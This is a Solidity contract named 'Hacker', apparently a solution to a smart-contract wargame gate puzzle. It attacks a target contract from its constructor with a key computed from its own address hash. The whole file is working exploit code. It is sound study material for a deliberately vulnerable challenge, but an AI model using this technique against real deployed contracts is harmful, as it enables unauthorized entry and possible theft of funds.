// SPDX-License-Identifier: MIT
pragma solidity >=0.6.5 <0.9.0;

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor(address _target) public {
    hacker = msg.sender;
    attack(_target);
  }

  function attack(address _target) private {
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
    (bool result, ) = _target.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    require(result, "Hacker: Attack failed!");
  }
}
